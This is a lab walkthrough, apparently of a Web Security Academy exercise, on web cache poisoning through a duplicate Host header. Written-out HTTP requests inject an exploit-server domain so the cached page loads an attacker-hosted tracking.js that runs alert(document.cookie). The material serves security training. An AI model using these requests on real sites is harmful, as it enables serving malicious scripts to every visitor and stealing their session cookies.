# Exploiting Web Cache Poisoning via Ambiguous Requests

This guide delivers a clear, creative, and organized walkthrough to exploit a **web cache poisoning** vulnerability using ambiguous HTTP requests. Picture yourself as a master puppeteer, manipulating the server’s cache to serve a malicious script to unsuspecting victims! The objective is to inject a malicious `Host` header to poison the cache, serve a malicious JavaScript file from your exploit server, and trigger an `alert(document.cookie)` to solve the lab.

## Objective
Poison the cache by adding a second `Host` header to manipulate a script’s URL, serve a malicious `tracking.js` from your exploit server, and execute a client-side payload to compromise the victim’s session.

## Prerequisites
- Burp Suite with Proxy and Repeater modules configured.
- Access to the lab application with a homepage and an exploit server (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).
- Basic understanding of web caching, HTTP headers, and cache poisoning.

## Background on the Vulnerability
The application validates the first `Host` header for routing but reflects an arbitrary second `Host` header in an absolute URL for `/resources/js/tracking.js`. The server’s cache stores responses based on the request, including query parameters, allowing attackers to poison the cache with a malicious script URL that executes for all users visiting the poisoned page.

## Steps to Solve the Lab

### Step 1: Analyze the Homepage Request
1. In Burp’s browser, open the lab and click **Home** to refresh the page.
2. In Burp Suite, go to **Proxy > HTTP history**, locate the `GET /` request, and right-click to select **Send to Repeater**.
4. Send the request.

![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(1).png)

### Step 2: Understand Cache Behavior
1. In the original `GET /` response, examine the caching headers (e.g., `Cache-Control`, `Age`).
2. **Observation**: The headers indicate cache hits and the age of cached responses.
3. Add a cache buster query parameter to ensure fresh responses, e.g.:
   ```
   GET /?cb=123 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   ```
4. Send the request, changing the `cb` value (e.g., `cb=124`) for each fresh request.
5. **Observation**: The cache buster forces the back-end server to generate a new response.

![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(2).png)

### Step 3: Test Second Host Header
1. In Repeater, add a second `Host` header with an arbitrary value:
   ```
   GET /?cb=123 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Host: example.com
   ```
2. Send the request.
3. **Observation**: The response is successful, and the second `Host` value (`example.com`) is reflected in an absolute URL for the script import, e.g., `http://example.com/resources/js/tracking.js`.
4. Send the same request again with the same `cb` value.
5. **Observation**: The cached response still includes the injected `Host` value, confirming cache poisoning potential.

![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(3).png)

### Step 4: Create Malicious Script on Exploit Server
1. Go to the exploit server and create a file at `/resources/js/tracking.js` with the following payload:
   ```javascript
   alert(document.cookie);
   ```
2. Store the file and copy the exploit server’s domain (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).
3. **Observation**: This script will execute for any user loading the poisoned page, exposing their cookies.

![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(4).png)

### Step 5: Poison the Cache
1. In Repeater, modify the `GET /?cb=123` request to include the exploit server’s domain as the second `Host` header:
   ```
   GET /?cb=123 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
2. Send the request multiple times (with the same `cb` value) until the response indicates a cache hit (check caching headers or response consistency).
3. **Observation**: The response includes the script import as `http://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js`.

![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(5).png)
![payload suc](./img/Web%20cache%20poisoning%20via%20ambiguous%20requests/Web%20cache%20poisoning%20via%20ambiguous%20requests(6).png)

